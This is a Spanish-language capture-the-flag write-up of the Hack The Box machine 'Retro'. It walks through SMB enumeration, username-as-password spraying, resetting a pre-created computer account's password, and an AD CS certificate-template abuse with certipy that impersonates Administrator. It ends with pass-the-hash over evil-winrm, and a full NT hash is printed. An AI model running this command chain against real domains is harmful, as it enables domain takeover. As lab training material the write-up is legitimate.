---
title: Retro
date: 2026-2-10 10:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, retro ]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/f990caf7a8b5b680435ce36b9b1a4815.png
    alt: Hack The Box
---

> Retro
Windows · Easy - Adventure mode


## 🔭 Reconocimiento: 

```shell
┌──(pmartinezr㉿kali)-[~/htb/retro]
└─$ nmap -p- -sSVC --min-rate 5000 10.129.119.130
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-10 10:45 +0100
Nmap scan report for 10.129.119.130
Host is up (0.044s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-10 09:45:58Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
|_ssl-date: 2026-02-10T09:47:31+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
|_ssl-date: 2026-02-10T09:47:31+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
|_ssl-date: 2026-02-10T09:47:31+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
|_ssl-date: 2026-02-10T09:47:31+00:00; 0s from scanner time.
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-10T09:46:51+00:00
|_ssl-date: 2026-02-10T09:47:31+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2026-02-09T09:44:23
|_Not valid after:  2026-08-11T09:44:23
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
50803/tcp open  msrpc         Microsoft Windows RPC
57441/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
57448/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-02-10T09:46:52
|_  start_date: N/A
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.53 seconds
```

Claramente nos enfrentamos a una máquina Windows


```shell
┌──(pmartinezr㉿kali)-[~/htb/retro]
└─$ smbclient -L 10.129.119.130 -U guest
Password for [WORKGROUP\guest]:
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
Notes           Disk
SYSVOL          Disk      Logon server share
Trainees        Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.119.130 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Comenzamos interrogando el servicio samba usando el usuario guest. 

```shell
┌──(pmartinezr㉿kali)-[~/htb/retro]
└─$ smbclient //10.129.119.130/Trainees -m SMB2 -U Guest
Password for [WORKGROUP\Guest]:
Try "help" to get a list of possible commands.
smb: \> ls
.                                   D        0  Sun Jul 23 23:58:43 2023
..                                DHS        0  Wed Jun 11 16:17:10 2025
Important.txt                       A      288  Mon Jul 24 00:00:13 2023
4659711 blocks of size 4096. 1326554 blocks available
```

El protocolo es ```smb2``` y el aparece un archivo ```Important.txt```el cual nos descargamos.

```
Dear Trainees,
I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.
Regards
The Admins
```

El contenido del archivo ```Important.txt```  muestra un mensaje de los administradores hacia un grupo de usuarios ```Trainees```
(aprendices), el resumen del mensaje es que van a unificar todos los usuarios aprendices en una cuenta para evitar
cambios continuos de contraseñas.

```shell
┌──(pmartinezr㉿kali)-[~/htb/retro]
└─$ nxc smb 10.129.119.130 --rid-brute -u Trainees -p ''
SMB         10.129.119.130   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.119.130   445    DC               [+] retro.vl\Trainees: (Guest)
SMB         10.129.119.130   445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.119.130   445    DC               500: RETRO\Administrator (SidTypeUser)
SMB         10.129.119.130   445    DC               501: RETRO\Guest (SidTypeUser)
SMB         10.129.119.130   445    DC               502: RETRO\krbtgt (SidTypeUser)
SMB         10.129.119.130   445    DC               512: RETRO\Domain Admins (SidTypeGroup)
SMB         10.129.119.130   445    DC               513: RETRO\Domain Users (SidTypeGroup)
SMB         10.129.119.130   445    DC               514: RETRO\Domain Guests (SidTypeGroup)
SMB         10.129.119.130   445    DC               515: RETRO\Domain Computers (SidTypeGroup)
SMB         10.129.119.130   445    DC               516: RETRO\Domain Controllers (SidTypeGroup)
SMB         10.129.119.130   445    DC               517: RETRO\Cert Publishers (SidTypeAlias)
SMB         10.129.119.130   445    DC               518: RETRO\Schema Admins (SidTypeGroup)
SMB         10.129.119.130   445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)
SMB         10.129.119.130   445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.119.130   445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.119.130   445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.119.130   445    DC               525: RETRO\Protected Users (SidTypeGroup)
SMB         10.129.119.130   445    DC               526: RETRO\Key Admins (SidTypeGroup)
SMB         10.129.119.130   445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.119.130   445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.119.130   445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.119.130   445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.119.130   445    DC               1000: RETRO\DC$ (SidTypeUser)
SMB         10.129.119.130   445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)
SMB         10.129.119.130   445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.119.130   445    DC               1104: RETRO\trainee (SidTypeUser)
SMB         10.129.119.130   445    DC               1106: RETRO\BANKING$ (SidTypeUser)
SMB         10.129.119.130   445    DC               1107: RETRO\jburley (SidTypeUser)
SMB         10.129.119.130   445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
SMB         10.129.119.130   445    DC               1109: RETRO\tblack (SidTypeUser)
```

Usando ```Netexec``` podemos identificar varios usuarios


```
trainee
BANKING$
jburley
tblack
```

Elaboro una lista de usuarios posibles en conformidad con los hayazgos

```shell
┌──(pmartinezr㉿kali)-[~/htb/retro]
└─$ nxc smb 10.129.119.130 -u users.txt -p users.txt --continue-on-success
SMB         10.129.119.130   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.119.130   445    DC               [-] Error checking if user is admin on 10.129.119.130: The NETBIOS connection with the remote host timed out.
SMB         10.129.119.130   445    DC               [+] retro.vl\trainee:trainee
SMB         10.129.119.130   445    DC               [-] retro.vl\BANKING$:trainee STATUS_LOGON_FAILURE
SMB         10.129.119.130   445    DC               [-] retro.vl\jburley:trainee STATUS_LOGON_FAILURE
SMB         10.129.119.130   445    DC               [-] retro.vl\tblack:trainee STATUS_LOGON_FAILURE
SMB         10.129.119.130   445    DC               [-] retro.vl\BANKING$:BANKING$ STATUS_LOGON_FAILURE
SMB         10.129.119.130   445    DC               [-] retro.vl\jburley:BANKING$ STATUS_LOGON_FAILURE
SMB         10.129.119.130   445    DC               [-] retro.vl\tblack:BANKING$ STATUS_LOGON_FAILURE
SMB         10.129.119.130   445    DC               [-] retro.vl\BANKING$:jburley STATUS_LOGON_FAILURE
SMB         10.129.119.130   445    DC               [-] retro.vl\jburley:jburley STATUS_LOGON_FAILURE
SMB         10.129.119.130   445    DC               [-] retro.vl\tblack:jburley STATUS_LOGON_FAILURE
SMB         10.129.119.130   445    DC               [-] retro.vl\BANKING$:tblack STATUS_LOGON_FAILURE
SMB         10.129.119.130   445    DC               [-] retro.vl\jburley:tblack STATUS_LOGON_FAILURE
SMB         10.129.119.130   445    DC               [-] retro.vl\tblack:tblack STATUS_LOGON_FAILURE
```

Fuerza "bruta" (en este caso no tan bruta) contra los usuarios usando como contraseñas los nombres de usuario.

``` shell
┌──(pmartinezr㉿kali)-[~/htb/retro]
└─$ smbclient  //10.129.119.130/Notes   -U trainee
Password for [WORKGROUP\trainee]:
Try "help" to get a list of possible commands.
smb: \> ls
.                                   D        0  Wed Apr  9 05:12:49 2025
..                                DHS        0  Wed Jun 11 16:17:10 2025
ToDo.txt                            A      248  Mon Jul 24 00:05:56 2023
user.txt                            A       32  Wed Apr  9 05:13:01 2025
4659711 blocks of size 4096. 1325519 blocks available
smb: \> get ToDo.txt
getting file \ToDo.txt of size 248 as ToDo.txt (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)
smb: \> get user.txt
getting file \user.txt of size 32 as user.txt (0.2 KiloBytes/sec) (average 0.8 KiloBytes/sec)
```

Por otro lado podemos encontrar dos archivos ```user.txt```  y un archivo ```ToDo.txt```


```shell
┌──(pmartinezr㉿kali)-[~/htb/retro]
└─$ cat user.txt
cbda362cff2099072c************
```

La primera flag se encuentra es este archivo


```
Thomas,
after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.
Best
James
```

Encontramos dos posibles cuentas ```Thomas``` y ```James``` e información sobre uno de los nombres de usuarios
que encontramos ```Banking$```. 

```shell
┌──(pmartinezr㉿kali)-[~/htb]
└─$  smbclient //retro.vl/Notes -U 'BANKING$%banking'
session setup failed: NT_STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```
La política de contraseñas es terrible y nos permite adivinar la password 

```NT_STATUS_LOGON_FAILURE``` sería el error común en este tipo deinicio de sesión. Indica que el intento de autenticación falló, pero no especifica la razón exacta. Sin embargo tenemos un ```NT_STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT``` este error ocurre cuando la cuenta del equipo (usada para la autenticación en el dominio) está deshabilitada, eliminada o su contraseña no está sincronizada con el controlador de dominio.

```shell
┌──(pmartinezr㉿kali)-[~/htb/retro]
└─$ impacket-changepasswd retro.vl/'Banking$':banking@10.129.119.130 -newpass abc123 -p rpc-samr
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
[*] Changing the password of retro.vl\Banking$
[*] Connecting to DCE/RPC as retro.vl\Banking$
[*] Password was changed successfully.
```
Cambiamos la password a través del protocolo rpc-samr, para "rehabilitarla" con ```impacket-changepasswd``` 

```shell
┌──(pmartinezr㉿kali)-[~/htb/retro]
└─$ smbclient  //10.129.119.130/Notes   -U 'Banking$'
Password for [WORKGROUP\Banking$]:
Try "help" to get a list of possible commands.
smb: \> ls
.                                   D        0  Wed Apr  9 05:12:49 2025
..                                DHS        0  Wed Jun 11 16:17:10 2025
ToDo.txt                            A      248  Mon Jul 24 00:05:56 2023
user.txt                            A       32  Wed Apr  9 05:13:01 2025
4659711 blocks of size 4096. 1317937 blocks available
smb: \>
```

Comprobamos la validad de la clave primero con ```smbclient```

```shell
┌──(pmartinezr㉿kali)-[~/htb/retro]
└─$ crackmapexec smb retro.vl -u 'banking$' -p abc123
SMB         retro.vl        445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         retro.vl        445    DC               [+] retro.vl\banking$:abc123
```

Ahora con ```crackmapexec``` que la nueva password funciona

```shell
┌──(pmartinezr㉿kali)-[~/htb/retro]
└─$ bloodhound-python -d retro.vl -u 'banking$' -p abc123 -ns 10.129.119.130 -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: retro.vl
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.retro.vl:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.retro.vl
INFO: Testing resolved hostname connectivity dead:beef::362c:d582:7ba7:d25
INFO: Trying LDAP connection to dead:beef::362c:d582:7ba7:d25
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.retro.vl
INFO: Testing resolved hostname connectivity dead:beef::362c:d582:7ba7:d25
INFO: Trying LDAP connection to dead:beef::362c:d582:7ba7:d25
INFO: Found 7 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer:
INFO: Querying computer: DC.retro.vl
INFO: Done in 00M 09S
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer:
INFO: Querying computer: DC.retro.vl
INFO: Done in 00M 05S
```

Probé a usar ```bloodhound-python``` para ver si recogía alguna otra información 

```shell
┌──(pmartinezr㉿kali)-[~/htb/retro]
└─$ certipy-ad account -u 'banking$' -p 'abc123' -dc-ip '10.129.119.130' -user 'Administrator' read
Certipy v5.0.4 - by Oliver Lyak (ly4k)
[*] Reading attributes for 'Administrator':
cn                                  : Administrator
distinguishedName                   : CN=Administrator,CN=Users,DC=retro,DC=vl
name                                : Administrator
objectSid                           : S-1-5-21-2983547755-698260136-4283918172-500
sAMAccountName                      : Administrator
userAccountControl                  : 66048
whenCreated                         : 2023-07-23T21:07:55+00:00
whenChanged                         : 2025-05-05T07:11:09+00:00
```

Obtenemos el ```objectSid``` necesario para continuar con la explotación
Ahiora con ```certipy-ad``` obtengo el ```objectSid``` necesario para el siguiente paso

```shell
┌──(pmartinezr㉿kali)-[~/htb/retro]
└─$ certipy-ad req  -u 'banking$' -p 'abc123' -dc-ip 10.129.119.130 -ca 'retro-DC-CA' -template 'RetroClients'  -upn 'administrator@retro.vl' -sid  'S-1-5-21-2983547755-698260136-4283918172-500' -target-ip 10.129.119.130 -key-size 4096
Certipy v5.0.4 - by Oliver Lyak (ly4k)
[*] Requesting certificate via RPC
[*] Request ID is 13
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@retro.vl'
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Podemos descarganos el certificado ```administrator.pfx```, lo usaremos en el siguiente paso

```shell
┌──(pmartinezr㉿kali)-[~/htb/retro]
└─$ certipy-ad auth -pfx 'administrator.pfx' -dc-ip 10.129.119.130
Certipy v5.0.4 - by Oliver Lyak (ly4k)
[*] Certificate identities:
[*]     SAN UPN: 'administrator@retro.vl'
[*]     SAN URL SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*]     Security Extension SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
```

Con el archivo ```administrator.pfx```  descargado obtengo el hash de administrador

```shell
┌──(pmartinezr㉿kali)-[~/htb/retro]
└─$ evil-winrm  -u Administrator -H 252fac7066d93dd009d4fd2cd0368389 -i retro.vl
Evil-WinRM shell v3.9
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
Directory: C:\Users\Administrator\Desktop
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          4/8/2025   8:11 PM             32 root.txt
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
40fce9c3f09024bc************
```

Finalmente con ```Evil-WinRM``` usamos el hash obtenido para conectarnos y obtener la flag ```root.txt```


[achivement](https://labs.hackthebox.com/achievement/machine/2336390/671)